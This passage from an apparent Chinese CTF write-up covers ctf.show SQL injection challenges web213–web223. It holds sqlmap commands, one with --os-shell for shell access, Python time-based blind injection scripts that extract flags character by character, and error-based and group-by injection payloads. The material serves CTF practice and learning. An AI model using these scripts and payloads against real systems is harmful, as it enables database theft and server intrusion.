python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavis -C ctfshow_flagxsa --dump 
</code></pre>
<h1 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h1><h2 id="使用–os-shell-一键getshell"><a href="#使用–os-shell-一键getshell" class="headerlink" title="使用–os-shell 一键getshell"></a>使用–os-shell 一键getshell</h2><pre><code>python sqlmap.py -u http://45646f72-e298-4956-87c9-62cea287a473.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://45646f72-e298-4956-87c9-62cea287a473.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web210 --dump  --os-shell --batch
</code></pre>
<p>这里还没写完,但是已经写的差不多了</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407222705713.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407222705713"></p>

<p>发现是一个上传文件页面</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407222740808.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407222740808"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223832502.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407223832502"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223908157.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407223908157"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223941771.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407223941771"></p>

<h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><p>没找到参数在哪,翻翻源码看看</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110118163.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408110118163"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110151699.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408110151699"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110311009.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408110311009"></p>

<p>我们看看这个select.js的写法,发现向api&#x2F;post了ip和debug两个参数</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>判断</p>
<pre><code class="python">import requests
url = &quot;http://74b615cd-aac0-4c4a-889f-84aa544d2a96.challenge.ctf.show/api/&quot;
payload = &quot;length(database())=0&quot; #没延迟
#payload = &quot;length(database())&gt;0&quot; #延迟
date = &#123;
    &#39;ip&#39;: f&quot;if((&#123;payload&#125;),sleep(2),1)&quot;,
    &#39;debug&#39;: &quot;0&quot;
&#125;
try:
    r = requests.post(url, data=date, timeout=1)
    print(&#39;没延迟&#39;)
except Exception as e:
    print(&#39;延迟&#39;)
</code></pre>
<pre><code class="python">&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;
import requests

url = &quot;http://d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show/api/&quot;

result = &quot;&quot;
i = 0
while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # 查数据库
        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        # 查列名字-id.flag
        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagx&#39;&quot;
        # 查数据
        payload = &quot;select flaga from ctfshow_flagx&quot;
        data = &#123;
            &#39;ip&#39;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,
            &#39;debug&#39;:&#39;0&#39;
        &#125;
        try:
            r = requests.post(url, data=data, timeout=1)
            tail = mid
        except Exception as e:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><h2 id="过滤单引号时间盲注"><a href="#过滤单引号时间盲注" class="headerlink" title="过滤单引号时间盲注"></a>过滤单引号时间盲注</h2><pre><code class="python">&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;
import requests

url = &quot;http://4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show/api/&quot;

result = &quot;&quot;
i = 0
while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # 查数据库
        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        # 查列名字-id.flag
        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxc&#39;&quot;
        # 查数据
        payload = &quot;select flagaa from ctfshow_flagxc&quot;
        data = &#123;
            &#39;ip&#39;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1) and &#39;1&#39;=&#39;1&quot;,
            &#39;debug&#39;:&#39;0&#39;
        &#125;
        try:
            r = requests.post(url, data=data, timeout=1)
            tail = mid
        except Exception as e:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><h2 id="base64解码id"><a href="#base64解码id" class="headerlink" title="base64解码id"></a>base64解码id</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408124221533.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408124221533"></p>

<pre><code class="python">&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;
import requests

url = &quot;http://0f3060ee-be00-4090-a8e7-fc0944779c24.chall.ctf.show/api/&quot;

result = &quot;&quot;
i = 0
while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # 查数据库
        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        # 查列名字-id.flag
        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxcc&#39;&quot;
        # 查数据
        payload = &quot;select flagaac from ctfshow_flagxcc&quot;
        data = &#123;
            &#39;ip&#39;: f&quot;&#39;MQ==&#39;) or if (ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1&quot;,
            &#39;debug&#39;:&#39;0&#39;
        &#125;
        try:
            r = requests.post(url, data=data, timeout=1)
            tail = mid
        except Exception as e:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><h2 id="benchmark-时间盲注"><a href="#benchmark-时间盲注" class="headerlink" title="benchmark()时间盲注"></a>benchmark()时间盲注</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408132254910.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408132254910"></p>

<pre><code> benchmark(t,exp)
     select benchmark(count,expr),是重复执行count次expr表达式，使得处理时间很长，来产生延迟，
     比如select benchmark(1000000,encode(&quot;hello&quot;,&quot;good&quot;));
     select benchmark( 5000000, md5( &#39;test&#39; ));
</code></pre>
<p>判断</p>
<pre><code class="python">import requests
url = &quot;http://9b2612c9-bd0f-4733-9729-1efec72f21f9.challenge.ctf.show/api/&quot;
#payload = &quot;length(database())=0&quot; #没延迟
payload = &quot;length(database())&gt;0&quot; #延迟
date = &#123;
    &#39;ip&#39;: f&quot;1) or if((&#123;payload&#125;),benchmark(3480500,sha(1)),1)#&quot;,
    &#39;debug&#39;: &quot;0&quot;
&#125;
try:
    r = requests.post(url, data=date, timeout=1)
    print(&#39;没延迟&#39;)
except Exception as e:
    print(&#39;延迟&#39;)
</code></pre>
<pre><code class="python">import requests
import time

url = &quot;http://bc98f2a3-911d-4606-9d0e-e277bf086bdf.challenge.ctf.show/api/&quot;

ans = &quot;&quot;
i = 0

while True:
    i += 1
    head = 32
    tail = 127
    j = 0
    while head &lt; tail:
        j += 1
        if j / 2 == 1: #算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差
            time.sleep(2)
        mid = (head + tail) &gt;&gt; 1
        #表名 ctfshow_flagxccb
        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        #字段名 flagaabc
        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxccb&#39;&quot;
        # 数据 防止查错咱们多等会呗,可用改改benchmark的循环次数,我改到7400000
        payload = &quot;select flagaabc from ctfshow_flagxccb&quot;

        data = &#123;
            &#39;ip&#39; :f&quot;1) or if((ascii(substr((&#123;payload&#125;),&#123;i&#125;,1)))&gt;&#123;mid&#125;,benchmark(3480500,sha(1)),1&quot;,
            &#39;debug&#39; : &#39;0&#39;
        &#125;

        try:
            r = requests.post(url , data= data ,timeout=1)
            #time.sleep(0.3)
            tail = mid
        except Exception as e:
            head = mid +1
    if head != 32:
        ans += chr(head)
    else:
        break
    print(ans)
</code></pre>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/13019703.html">MySQL时间盲注五种延时方法</a></p>
<h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><h2 id="多表联合查询时间盲注"><a href="#多表联合查询时间盲注" class="headerlink" title="多表联合查询时间盲注"></a>多表联合查询时间盲注</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408142736722.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408142736722"></p>

<pre><code class="python">import requests
import time

url = &quot;http://8121f42d-c9da-4307-94b0-c7345a92f907.challenge.ctf.show/api/&quot;

ans = &quot;&quot;
i = 0

while True:
    i += 1
    head = 32
    tail = 127
    j = 0
    while head &lt; tail:
        j += 1
        #算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差
        time.sleep(6)
        mid = (head + tail) &gt;&gt; 1
        #表名 ctfshow_flagxc
        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        #字段名 flagaabc
        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxc&#39;&quot;
        # 数据 防止查错咱们多等会呗 我直接就查一个
        payload = &quot;select flagaac from ctfshow_flagxc&quot;
        #ctfshow&#123;2d33427a-d593-4d42-85a2-a459a676b1b0&#125;
        data = &#123;
            &#39;ip&#39; :f&quot;1) or if((ascii(substr((&#123;payload&#125;),&#123;i&#125;,1)))&gt;&#123;mid&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H),1&quot;,
            &#39;debug&#39; : &#39;0&#39;
        &#125;

        try:
            r = requests.post(url , data= data ,timeout=1)
            #time.sleep(0.3)
            tail = mid
        except Exception as e:
            head = mid +1
    if head != 32:
        ans += chr(head)
    else:
        break
    print(ans)
</code></pre>
<h1 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408172145807.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408172145807"></p>

<pre><code class="python">import requests
import time

url = &quot;http://51762119-b7e0-4b2a-a392-0f5fded552ac.challenge.ctf.show/api/&quot;

ans = &quot;&quot;
i = 0

while True:
    i += 1
    head = 32
    tail = 127
    j = 0
    while head &lt; tail:
        j += 1
        #算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差

        mid = (head + tail) &gt;&gt; 1
        #表名 ctfshow_flagxca
        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        #字段名 flagaabc
        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxca&#39;&quot;
        # 数据 防止查错咱们多等会呗 我直接就查一个
        payload = &quot;select flagaabc from ctfshow_flagxca&quot;
        #ctfshow&#123;96c90aaa-5a9f-48bf-9ff0-814874d503f1&#125;
        data = &#123;
            &#39;ip&#39; :f&quot;1) or if((ascii(substr((&#123;payload&#125;),&#123;i&#125;,1)))&gt;&#123;mid&#125;,1,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H)&quot;,
            &#39;debug&#39; : &#39;0&#39;
        &#125;

        try:
            r = requests.post(url , data= data ,timeout=1)
            #time.sleep(0.3)
            head = mid +1
        except Exception as e:
            tail = mid
            time.sleep(6)
    if head != 32:
        ans += chr(head)
    else:
        break
    print(ans)
</code></pre>
<h1 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408184439334.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408184439334"></p>

<pre><code class="python">import requests
import time

url = &quot;http://51762119-b7e0-4b2a-a392-0f5fded552ac.challenge.ctf.show/api/&quot;
ans = &quot;&quot;
j = 1
dir = &quot;cfi_1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolpQWERTYUIOPASDFGHJKLZXCVBNM&quot;
while True:
    for i in dir:
        ans += i

        #表名 ctfshow_flagxcac
        #payload = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;
        #字段名 ctfshow_flagxcac
        payload = &quot;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxcac&#39; limit 1,1&quot;
        # 数据 防止查错咱们多等会呗 我直接就查一个
        payload = &quot;select flagaabcc from ctfshow_flagxcac&quot;
        #ctfshow&#123;96c90aaa-5a9f-48bf-9ff0-814874d503f1&#125;
        #print(f&quot;if(ord(left(&#123;payload&#125;,&#123;i&#125;))&gt;&#123;mid&#125;,1,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H)&quot;)

        data = &#123;
            &#39;ip&#39; :f&quot;1) or if((left((&#123;payload&#125;),&#123;j&#125;))=&#39;&#123;ans&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H),1&quot;,
            &#39;debug&#39; : &#39;0&#39;
        &#125;

        try:
            r = requests.post(url , data= data ,timeout=1)
            #time.sleep(0.3)
            ans = ans[:-1]
            print(&#39;正确&#39;)
        except Exception as e:
            print(ans)
            j += 1
            time.sleep(6)
            print(&#39;错误&#39;)
</code></pre>
<h1 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h1><h2 id="limit报错注入"><a href="#limit报错注入" class="headerlink" title="limit报错注入"></a>limit报错注入</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408211002396.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408211002396"></p>

<p>mysql利用procedure analyse()函数优化表的结构</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408211135617.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408211135617"></p>

<pre><code>/api/?page=1&amp;limit=10  procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408212617134.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408212617134"></p>

<p>直接提交这个数据库哦</p>
<p>还有这个</p>
<pre><code>/api/?page=1&amp;limit=10  procedure analyse((updatexml(1,concat(0x7e,database(),0x7e),1)),2)
</code></pre>
<h1 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h1><h2 id="group-by-注入"><a href="#group-by-注入" class="headerlink" title="group by 注入"></a>group by 注入</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408213246662.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408213246662"></p>

<pre><code>select * from ctfshow_user group by 1,if(1=1,sleep(1),1);
</code></pre>
<pre><code>
</code></pre>
<h1 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408214846588.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408214846588"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408215003341.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220408215003341"></p>

